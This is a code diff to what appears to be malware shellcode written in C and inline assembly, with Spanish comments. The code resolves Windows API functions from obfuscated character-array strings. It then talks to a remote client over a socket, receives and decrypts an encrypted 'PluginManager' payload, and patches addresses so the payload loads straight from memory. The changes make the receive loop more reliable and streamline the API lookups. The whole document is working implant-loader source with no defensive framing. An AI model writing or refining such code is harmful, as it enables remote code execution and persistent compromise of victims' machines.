@@ -18,7 +18,6 @@ struct SHELLCODE_CONTEXT{
     HMODULE                         KERNEL32;
     _LoadLibraryA                   LoadLibraryA__;
     _GetProcAddress                 GetProcAddress_A_;
-    _VirtualProtect                 VirtualProtect_;
     HMODULE                         WS2_32;
     _recv                           recv_;
     _send                           send_;
@@ -898,25 +897,33 @@ void __declspec(naked)AscToUni(){
 
 void Payload(SHELLCODE_CONTEXT *scc){
     //Enviamos el OK al cliente.
-    char ok[16] = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
-    DWORD dwDSize = 15;
+    char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
+    DWORD dwDSize   = 15;
     scc->CryptEncrypt_(scc->hKey, 0, true, 0, (BYTE*)ok, &dwDSize, sizeof(ok));
 
     scc->send_(scc->hSocket, ok, sizeof(ok), 0);
 
     //Recibimos el tamaño del PluginManager
-    DWORD dwSize;
+    DWORD dwSize    = 0;
     if ((scc->recv_(scc->hSocket, (char*)&dwSize, sizeof(DWORD), 0) == 4)&&(dwSize > 0)){   //Si lo que hemos recibido es un DWORD y nos han aceptado el OK...
         //Hacemos sitio para almacenar el PluginManager
         char* bBuff = (char*)scc->malloc__(dwSize);
         if (bBuff > 0){
-            #define MSG_WAITALL 0x8
+            DWORD dwASize   = dwSize;
+            DWORD lResult   = 0;
+            bool  bReceived = true;
+
             //Recibimos el PluginManager
-            scc->recv_(scc->hSocket, (char*)bBuff, dwSize, MSG_WAITALL);
+            while ((dwASize > 0) && (bReceived==true)){
+                lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
+                dwASize -= lResult;
+                if(lResult < 0)
+                    bReceived = false;
+            }
             dwDSize = dwSize;
 
             //Lo desciframos
-            if (scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1){
+            if ((bReceived==true)&&(scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1)){
                 //Procedemos a comprobar el Checksum
                 DWORD oChecksum = *(DWORD*)bBuff;
                 //Saltamos el Checksum de los datos recibidos
@@ -971,7 +978,7 @@ find_delta:
     scc.GetProcAddress_A_   = pGPA;
     scc.hSocket             = hSocket;
     scc.hKey                = hKEY;
-
+    
     char sKERNEL32[]        = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '\0'};
     char sVirtualProtect[]  = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
     char sTlsAlloc[]        = {'T', 'l', 's', 'A', 'l', 'l', 'o', 'c', '\0'};
@@ -990,30 +997,26 @@ find_delta:
     char sMSVCRT[]          = {'m', 's', 'v', 'c', 'r', 't', '\0'};
     char smalloc_[]          = {'m', 'a', 'l', 'l', 'o', 'c', '\0'};
 
-    scc.KERNEL32            = scc.LoadLibraryA__(sKERNEL32);
-    scc.VirtualProtect_     = (_VirtualProtect)scc.GetProcAddress_A_(scc.KERNEL32, sVirtualProtect);
+    scc.WS2_32              = pLoadLibA(sWS2_32);
+    scc.send_               = (_send)pGPA(scc.WS2_32, ssend);
+    scc.recv_               = (_recv)pGPA(scc.WS2_32, srecv);
 
-    scc.WS2_32              = scc.LoadLibraryA__(sWS2_32);
-    scc.send_               = (_send)scc.GetProcAddress_A_(scc.WS2_32, ssend);
-    scc.recv_               = (_recv)scc.GetProcAddress_A_(scc.WS2_32, srecv);
+    scc.ADVAPI32            = pLoadLibA(sADVAPI32);
+    scc.CryptDecrypt_       = (_CryptDecrypt)pGPA(scc.ADVAPI32, sCryptDecrypt);
+    scc.CryptEncrypt_       = (_CryptEncrypt)pGPA(scc.ADVAPI32, sCryptEncrypt);
 
-    scc.ADVAPI32            = scc.LoadLibraryA__(sADVAPI32);
-    scc.CryptDecrypt_       = (_CryptDecrypt)scc.GetProcAddress_A_(scc.ADVAPI32, sCryptDecrypt);
-    scc.CryptEncrypt_       = (_CryptEncrypt)scc.GetProcAddress_A_(scc.ADVAPI32, sCryptEncrypt);
-
-    scc.MSVCRT              = scc.LoadLibraryA__(sMSVCRT);
-    scc.malloc__             = (_malloc)scc.GetProcAddress_A_(scc.MSVCRT, smalloc_);
+    scc.MSVCRT              = pLoadLibA(sMSVCRT);
+    scc.malloc__             = (_malloc)pGPA(scc.MSVCRT, smalloc_);
 
     //Parcheamos direcciones para LoadLibraryFromMemory()
-
-    *(DWORD*)((PBYTE)VirtualProtect_ + tDelta + 1)          = (DWORD)scc.VirtualProtect_;
-    *(DWORD*)((PBYTE)LoadLibraryA_ + tDelta + 1)            = (DWORD)scc.LoadLibraryA__;
-    *(DWORD*)((PBYTE)GetProcAddress_ + tDelta + 1)          = (DWORD)scc.GetProcAddress_A_;
+    *(DWORD*)((PBYTE)LoadLibraryA_ + tDelta + 1)            = (DWORD)pLoadLibA;
+    *(DWORD*)((PBYTE)GetProcAddress_ + tDelta + 1)          = (DWORD)pGPA;
     *(DWORD*)((PBYTE)malloc_ + tDelta + 1)                  = (DWORD)scc.malloc__;
-    *(DWORD*)((PBYTE)TlsAlloc_ + tDelta + 1)                = (DWORD)scc.GetProcAddress_A_(scc.KERNEL32, sTlsAlloc);
-    *(DWORD*)((PBYTE)TlsSetValue_ + tDelta + 1)             = (DWORD)scc.GetProcAddress_A_(scc.KERNEL32, sTlsSetValue);
-    *(DWORD*)((PBYTE)VirtualAlloc_ + tDelta + 1)            = (DWORD)scc.GetProcAddress_A_(scc.KERNEL32, sVirtualAlloc);
-    *(DWORD*)((PBYTE)VirtualFree_ + tDelta + 1)             = (DWORD)scc.GetProcAddress_A_(scc.KERNEL32, sVirtualFree);
+    *(DWORD*)((PBYTE)VirtualProtect_ + tDelta + 1)          = (DWORD)pGPA(pLoadLibA(sKERNEL32), sVirtualProtect);
+    *(DWORD*)((PBYTE)TlsAlloc_ + tDelta + 1)                = (DWORD)pGPA(pLoadLibA(sKERNEL32), sTlsAlloc);
+    *(DWORD*)((PBYTE)TlsSetValue_ + tDelta + 1)             = (DWORD)pGPA(pLoadLibA(sKERNEL32), sTlsSetValue);
+    *(DWORD*)((PBYTE)VirtualAlloc_ + tDelta + 1)            = (DWORD)pGPA(pLoadLibA(sKERNEL32), sVirtualAlloc);
+    *(DWORD*)((PBYTE)VirtualFree_ + tDelta + 1)             = (DWORD)pGPA(pLoadLibA(sKERNEL32), sVirtualFree);
 
     Payload(&scc);
     __asm{
